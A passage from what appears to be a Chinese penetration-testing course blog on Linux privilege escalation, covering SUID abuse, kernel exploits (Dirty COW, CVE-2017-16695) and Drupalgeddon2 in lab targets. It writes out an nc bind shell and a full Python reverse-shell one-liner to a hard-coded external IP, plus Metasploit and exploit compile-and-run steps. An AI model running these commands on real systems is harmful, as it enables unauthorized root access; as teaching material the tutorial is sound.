src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424003630621.png" alt="image-20230424003630621"></p><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424003703720.png" alt="image-20230424003703720"></p><h6 id="如果不能连接就用webshell输入sql命令开启外连"><a href="#如果不能连接就用webshell输入sql命令开启外连" class="headerlink" title="如果不能连接就用webshell输入sql命令开启外连"></a>如果不能连接就用webshell输入sql命令开启外连</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424004116435.png" alt="image-20230424004116435"></p><h6 id="但是仍然连接不上"><a href="#但是仍然连接不上" class="headerlink" title="但是仍然连接不上"></a>但是仍然连接不上</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424004324145.png" alt="image-20230424004324145"></p><h6 id="原因是这个靶场有内置的防火墙过滤"><a href="#原因是这个靶场有内置的防火墙过滤" class="headerlink" title="原因是这个靶场有内置的防火墙过滤"></a>原因是这个靶场有内置的防火墙过滤</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424004442515.png" alt="image-20230424004442515"></p><h6 id="所以考虑以下两种方法"><a href="#所以考虑以下两种方法" class="headerlink" title="所以考虑以下两种方法"></a>所以考虑以下两种方法</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424004619468.png" alt="image-20230424004619468"></p><h6 id="隧道出网"><a href="#隧道出网" class="headerlink" title="隧道出网"></a>隧道出网</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424004721808.png" alt="image-20230424004721808"></p><h6 id="在哥斯拉webshell管理器上，让其自己来找我们的主机"><a href="#在哥斯拉webshell管理器上，让其自己来找我们的主机" class="headerlink" title="在哥斯拉webshell管理器上，让其自己来找我们的主机"></a>在哥斯拉webshell管理器上，让其自己来找我们的主机</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424005908178.png" alt="image-20230424005908178"></p><h6 id="下面的日志会显示"><a href="#下面的日志会显示" class="headerlink" title="下面的日志会显示"></a>下面的日志会显示</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424005951626.png" alt="image-20230424005951626"></p><h6 id="继续填写信息，这里地址和端口不能填其服务器的了"><a href="#继续填写信息，这里地址和端口不能填其服务器的了" class="headerlink" title="继续填写信息，这里地址和端口不能填其服务器的了"></a>继续填写信息，这里地址和端口不能填其服务器的了</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424010339197.png" alt="image-20230424010339197"></p><h6 id="继续连接，连接成功"><a href="#继续连接，连接成功" class="headerlink" title="继续连接，连接成功"></a>继续连接，连接成功</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424010925178.png" alt="image-20230424010925178"></p><h6 id="还可以利用其他的常用数据库"><a href="#还可以利用其他的常用数据库" class="headerlink" title="还可以利用其他的常用数据库"></a>还可以利用其他的常用数据库</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424011042737.png" alt="image-20230424011042737"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Day103 权限提升-Linux系统&amp;辅助项目&amp;脏牛&amp;Dirty&amp;内核漏洞&amp;SUID&amp;GUID</title>
      <link href="/2023/04/17/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/"/>
      <url>/2023/04/17/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423120205114.png" alt="image-20230423120205114"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Linux提权辅助项目-探针&amp;漏扫</p><p>2、Linux提权-配置SUID&amp;内核CVE</p><h3 id="系列内容："><a href="#系列内容：" class="headerlink" title="#系列内容："></a>#系列内容：</h3><p>内核，数据库，第三方服务，SUID&amp;GUID，定时任务，环境变量，SUDO，权限不当等</p><p>脏牛漏洞(CVE-2016-5195)</p><p>Dirty Pipe(CVE-2022-0847)</p><p>SUDO(CVE-2021-3156）</p><p>Polkit(CVE-2021-4034)</p><h3 id="截至目前思路点总结如下："><a href="#截至目前思路点总结如下：" class="headerlink" title="#截至目前思路点总结如下："></a>#截至目前思路点总结如下：</h3><p>1.提权方法有部分适用在不同环境，当然也有通用方法</p><p>2.提权方法也有操作系统版本区分，特性决定方法利用面</p><p>3.提权方法有部分需要特定环境，如数据库,第三方提权等</p><h3 id="思考点："><a href="#思考点：" class="headerlink" title="#思考点："></a>#思考点：</h3><p>1、如何判断采用什么数据库提权？</p><p>2、数据库提权首要条件密码获取？</p><p>3、有那些数据库类型可以进行提权？</p><p>4、操作系统在数据库提权中有那些疑问？</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、Web权限提升</p><p>2、系统权限提升</p><p>3、域控权限提升</p><h3 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h3><h5 id="1、具体有哪些权限需要我们了解掌握的？"><a href="#1、具体有哪些权限需要我们了解掌握的？" class="headerlink" title="1、具体有哪些权限需要我们了解掌握的？"></a>1、具体有哪些权限需要我们了解掌握的？</h5><p>后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等</p><h5 id="2、以上常见权限获取方法简要归类说明？"><a href="#2、以上常见权限获取方法简要归类说明？" class="headerlink" title="2、以上常见权限获取方法简要归类说明？"></a>2、以上常见权限获取方法简要归类说明？</h5><p>后台权限：SQL注入,数据库备份泄露，默认或弱口令等获取帐号密码进入</p><p>网站权限：后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达Shell</p><p>数据库权限：SQL注入,数据库备份泄露，默认或弱口令等进入或网站权限获取后转入</p><p>接口权限：SQL注入,数据库备份泄露，源码泄漏，培植不当等或网站权限获取后转入</p><p>系统权限：高危系统漏洞直达或网站权限提升转入、数据库权限提升转入，第三方转入等</p><p>域控权限：高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等</p><h5 id="3、以上常见权限获取后能操作的具体事情"><a href="#3、以上常见权限获取后能操作的具体事情" class="headerlink" title="3、以上常见权限获取后能操作的具体事情?"></a>3、以上常见权限获取后能操作的具体事情?</h5><h5 id="后台权限"><a href="#后台权限" class="headerlink" title="后台权限:"></a>后台权限:</h5><p>常规WEB界面文章分类等操作，后台功能可操作类</p><h5 id="网站权限："><a href="#网站权限：" class="headerlink" title="网站权限："></a>网站权限：</h5><p>查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备。</p><h5 id="数据库权限："><a href="#数据库权限：" class="headerlink" title="数据库权限："></a>数据库权限：</h5><p>操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配置文件读取获得。也可以作为提升系统权限手段。</p><h5 id="接口权限："><a href="#接口权限：" class="headerlink" title="接口权限："></a>接口权限：</h5><p>后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取），具体可以操作的事情大家自己想想。</p><p>系统权限：如同在你自己操作自己的电脑一样</p><p>域控权限：如同在你自己操作自己的虚拟机一样</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="一些文件程序本身不具有root权限，但是root赋予其suid，让其在执行命令的时候才有root权限"><a href="#一些文件程序本身不具有root权限，但是root赋予其suid，让其在执行命令的时候才有root权限" class="headerlink" title="一些文件程序本身不具有root权限，但是root赋予其suid，让其在执行命令的时候才有root权限"></a><code>一些文件程序本身不具有root权限，但是root赋予其suid，让其在执行命令的时候才有root权限</code></h4><h4 id="➢-Linux-辅助项目配置安全-amp-内核漏洞-探针漏扫"><a href="#➢-Linux-辅助项目配置安全-amp-内核漏洞-探针漏扫" class="headerlink" title="➢ Linux-辅助项目配置安全&amp;内核漏洞-探针漏扫"></a>➢ Linux-辅助项目配置安全&amp;内核漏洞-探针漏扫</h4><h4 id="➢-Linux-配置安全SUID提权探针-amp-利用-云服务器"><a href="#➢-Linux-配置安全SUID提权探针-amp-利用-云服务器" class="headerlink" title="➢ Linux-配置安全SUID提权探针&amp;利用-云服务器"></a>➢ Linux-配置安全SUID提权探针&amp;利用-云服务器</h4><h4 id="➢-Linux-内核漏洞本地用户提权-探针-amp-利用-墨者"><a href="#➢-Linux-内核漏洞本地用户提权-探针-amp-利用-墨者" class="headerlink" title="➢ Linux-内核漏洞本地用户提权-探针&amp;利用-墨者"></a>➢ Linux-内核漏洞本地用户提权-探针&amp;利用-墨者</h4><h4 id="➢-Linux-内核漏洞Web用户提权-探针-amp-利用-脏牛"><a href="#➢-Linux-内核漏洞Web用户提权-探针-amp-利用-脏牛" class="headerlink" title="➢ Linux-内核漏洞Web用户提权-探针&amp;利用-脏牛"></a>➢ Linux-内核漏洞Web用户提权-探针&amp;利用-脏牛</h4><h4 id="➢-Linux-内核漏洞本地用户提权-探针-amp-利用-DirtyPipe"><a href="#➢-Linux-内核漏洞本地用户提权-探针-amp-利用-DirtyPipe" class="headerlink" title="➢ Linux-内核漏洞本地用户提权-探针&amp;利用-DirtyPipe"></a>➢ Linux-内核漏洞本地用户提权-探针&amp;利用-DirtyPipe</h4></blockquote><h3 id="Linux-辅助项目配置安全-amp-内核漏洞-探针-amp-漏扫"><a href="#Linux-辅助项目配置安全-amp-内核漏洞-探针-amp-漏扫" class="headerlink" title="#Linux-辅助项目配置安全&amp;内核漏洞-探针&amp;漏扫"></a>#Linux-辅助项目配置安全&amp;内核漏洞-探针&amp;漏扫</h3><p><a href="https://github.com/liamg/traitor">https://github.com/liamg/traitor</a></p><p><a href="https://github.com/AlessandroZ/BeRoot">https://github.com/AlessandroZ/BeRoot</a></p><p><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><p><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><p><a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a></p><p><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a> </p><p>一个综合类探针：traitor</p><p>一个自动化提权：BeRoot(gtfobins&amp;lolbas)</p><p>两个信息收集：LinEnum linuxprivchecker</p><p>两个漏洞探针：linux-exploit-suggester&amp;2</p><p>二进制文件提权查询：</p><p>Linux：<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><p>Windows：<a href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a></p><h3 id="Linux-配置安全SUID提权-探针-amp-利用-云服务器"><a href="#Linux-配置安全SUID提权-探针-amp-利用-云服务器" class="headerlink" title="#Linux-配置安全SUID提权-探针&amp;利用-云服务器"></a>#Linux-配置安全SUID提权-探针&amp;利用-云服务器</h3><p>漏洞成因：chmod u+s给予了suid u-s删除了suid</p><p>使程序在运行中受到了suid root权限的执行过程导致</p><h5 id="提权过程：探针是否有SUID-手工或脚本-特定SUID利用-利用吃瓜-GG"><a href="#提权过程：探针是否有SUID-手工或脚本-特定SUID利用-利用吃瓜-GG" class="headerlink" title="提权过程：探针是否有SUID(手工或脚本)-特定SUID利用-利用吃瓜-GG"></a><code>提权过程：探针是否有SUID(手工或脚本)-特定SUID利用-利用吃瓜-GG</code></h5><h5 id="手工命令探针安全："><a href="#手工命令探针安全：" class="headerlink" title="手工命令探针安全："></a>手工命令探针安全：</h5><p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</p><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p><p>find &#x2F; -user root -perm -4000 -exec ls -ldb {} ;</p><h5 id="脚本项目探针安全："><a href="#脚本项目探针安全：" class="headerlink" title="脚本项目探针安全："></a>脚本项目探针安全：</h5><h6 id="LinEnum-sh-、traitor、-linuxprivchecker"><a href="#LinEnum-sh-、traitor、-linuxprivchecker" class="headerlink" title="LinEnum.sh 、traitor、 linuxprivchecker"></a>LinEnum.sh 、traitor、 linuxprivchecker</h6><p>利用LinEnum.sh找到了find关键字</p><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423133851958.png" alt="image-20230423133851958"></p><h5 id="参考利用："><a href="#参考利用：" class="headerlink" title="参考利用："></a>参考利用：</h5><blockquote><h5 id="一些具有suid权限的常用命令获取root的方法："><a href="#一些具有suid权限的常用命令获取root的方法：" class="headerlink" title="一些具有suid权限的常用命令获取root的方法："></a><code>一些具有suid权限的常用命令获取root的方法：</code></h5><p><strong><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></strong></p><p><strong><a href="https://pentestlab.blog/2017/09/25/suid-executables/">https://pentestlab.blog/2017/09/25/suid-executables/</a></strong></p></blockquote><ul><li><h6 id="touch-xiaodi（也可以不创建，find搜索一个已知的文件也行）"><a href="#touch-xiaodi（也可以不创建，find搜索一个已知的文件也行）" class="headerlink" title="touch xiaodi（也可以不创建，find搜索一个已知的文件也行）"></a>touch xiaodi（也可以不创建，find搜索一个已知的文件也行）</h6></li><li><h6 id="find-xiaodi-exec-whoami"><a href="#find-xiaodi-exec-whoami" class="headerlink" title="find xiaodi -exec whoami ;"></a>find xiaodi -exec whoami ;</h6></li></ul><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423134556359.png" alt="image-20230423134556359"></p><h5 id="利用NC反弹："><a href="#利用NC反弹：" class="headerlink" title="利用NC反弹："></a>利用NC反弹：</h5><ul><li><code>find xiaodi -exec netcat -lvp 5555 -e /bin/sh \;</code> （在被控主机启动一个会话，将5555端口绑定&#x2F;bin&#x2F;sh）</li><li>netcat xx.xx.xx.xx 5555 （本机连接这个会话）</li><li>但是可能不成功，因为有的linux上的nc是低版本，没有参数-e</li><li><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423134914006.png" alt="image-20230423134914006"></li></ul><h5 id="利用Python反弹：（如果上面的不行）"><a href="#利用Python反弹：（如果上面的不行）" class="headerlink" title="利用Python反弹：（如果上面的不行）"></a>利用Python反弹：（如果上面的不行）</h5><ul><li><code>find xiaodi -exec python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.94.236.117&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39; \;</code>   （用python编写代码连接，这个代码在棱角社区有,其主机没有python命令，就写python3尝试）</li><li>nc -lvvp 7777</li><li><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423135554585.png" alt="image-20230423135554585"></li><li>find xiaodi -exec whoami ;</li><li><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423135729449.png" alt="image-20230423135729449"></li></ul><h3 id="Linux-内核漏洞本地用户提权-探针-amp-利用-Mozhe-CVE-2017-16695"><a href="#Linux-内核漏洞本地用户提权-探针-amp-利用-Mozhe-CVE-2017-16695" class="headerlink" title="#Linux-内核漏洞本地用户提权-探针&amp;利用-Mozhe CVE-2017-16695"></a>#Linux-内核漏洞本地用户提权-探针&amp;利用-Mozhe CVE-2017-16695</h3><h5 id="提权过程：连接-获取可利用漏洞-下载或上传EXP-编译EXP-给权限执行-GG"><a href="#提权过程：连接-获取可利用漏洞-下载或上传EXP-编译EXP-给权限执行-GG" class="headerlink" title="提权过程：连接-获取可利用漏洞-下载或上传EXP-编译EXP-给权限执行-GG"></a><code>提权过程：连接-获取可利用漏洞-下载或上传EXP-编译EXP-给权限执行-GG</code></h5><ul><li>探针项目：BeRoot linux-exploit-suggester linux-exploit-suggester2</li><li>gcc 45010.c -o exp</li><li>chmod +x exp</li><li>.&#x2F;exp</li><li>id</li></ul><h6 id="上传探针脚本"><a href="#上传探针脚本" class="headerlink" title="上传探针脚本"></a>上传探针脚本</h6><h6 id="sh脚本"><a href="#sh脚本" class="headerlink" title="sh脚本"></a>sh脚本</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423142631628.png" alt="image-20230423142631628"></p><h6 id="pl脚本"><a href="#pl脚本" class="headerlink" title="pl脚本"></a>pl脚本</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423143115344.png" alt="image-20230423143115344"></p><h6 id="给权限"><a href="#给权限" class="headerlink" title="给权限"></a>给权限</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423142732889.png" alt="image-20230423142732889"></p><h6 id="les-sh脚本"><a href="#les-sh脚本" class="headerlink" title="les.sh脚本"></a>les.sh脚本</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423143242248.png" alt="image-20230423143242248"></p><h6 id="pl脚本-1"><a href="#pl脚本-1" class="headerlink" title="pl脚本"></a>pl脚本</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423143210017.png" alt="image-20230423143210017"></p><h6 id="都检测到了CVE-2017-16695-上传漏洞利用c源代码"><a href="#都检测到了CVE-2017-16695-上传漏洞利用c源代码" class="headerlink" title="都检测到了CVE-2017-16695,上传漏洞利用c源代码"></a>都检测到了CVE-2017-16695,上传漏洞利用c源代码</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423144812149.png" alt="image-20230423144812149"></p><h6 id="编译c语言文件"><a href="#编译c语言文件" class="headerlink" title="编译c语言文件"></a>编译c语言文件</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423145025128.png" alt="image-20230423145025128"></p><p>.&#x2F;exp运行，获得root权限</p><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423145143302.png" alt="image-20230423145143302"></p><h3 id="Linux-内核漏洞Web用户提权-探针-amp-利用-脏牛dcow"><a href="#Linux-内核漏洞Web用户提权-探针-amp-利用-脏牛dcow" class="headerlink" title="#Linux-内核漏洞Web用户提权-探针&amp;利用-脏牛dcow"></a>#Linux-内核漏洞Web用户提权-探针&amp;利用-脏牛dcow</h3><p>内核提权整个过程：（linux-exploit-suggester获取信息）</p><h5 id="vulnhub靶机-探针目标-CMS漏洞利用-脚本探针提权漏洞-利用内核提权-GG"><a href="#vulnhub靶机-探针目标-CMS漏洞利用-脚本探针提权漏洞-利用内核提权-GG" class="headerlink" title="vulnhub靶机-探针目标-CMS漏洞利用-脚本探针提权漏洞-利用内核提权-GG"></a><code>vulnhub靶机-探针目标-CMS漏洞利用-脚本探针提权漏洞-利用内核提权-GG</code></h5><p>内核漏洞提权过程：寻可用-下exp-上&#x2F;tmp-编译exp-执行(无权限用chmod)</p><ul><li><p>nmap 192.168.46.0&#x2F;24 （扫描网段查看存活主机）</p></li><li><p>nmap -p1-65535 192.168.46.144 （扫描端口找到了1819）</p></li><li><h6 id="MSF："><a href="#MSF：" class="headerlink" title="MSF："></a>MSF：</h6></li><li><p>search drupal</p></li><li><p>use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2</p></li><li><p>set rhost 192.168.46.144</p></li><li><p>set rport 1898</p></li><li><p>run</p></li></ul><ol><li>upload &#x2F;root&#x2F;dcow.cpp &#x2F;tmp&#x2F;dcow.cpp</li><li>g++ -Wall -pedantic -O2 -std&#x3D;c++11 -pthread -o dcow dcow.cpp -lutil</li><li>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</li><li>.&#x2F;dcow</li><li>su root</li></ol><h6 id="找到这个cms的公开漏洞在MSF搜search-drupal上利用use-exploit-x2F-unix-x2F-webapp-x2F-drupal-drupalgeddon2，获得webshell权限"><a href="#找到这个cms的公开漏洞在MSF搜search-drupal上利用use-exploit-x2F-unix-x2F-webapp-x2F-drupal-drupalgeddon2，获得webshell权限" class="headerlink" title="找到这个cms的公开漏洞在MSF搜search drupal上利用use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2，获得webshell权限"></a>找到这个cms的公开漏洞在MSF搜search drupal上利用use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2，获得webshell权限</h6><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423145533209.png" alt="image-20230423145533209"></p><h6 id="上传探测漏洞脚本并赋权，进入shell会话"><a href="#上传探测漏洞脚本并赋权，进入shell会话" class="headerlink" title="上传探测漏洞脚本并赋权，进入shell会话"></a>上传探测漏洞脚本并赋权，进入shell会话</h6><p><img 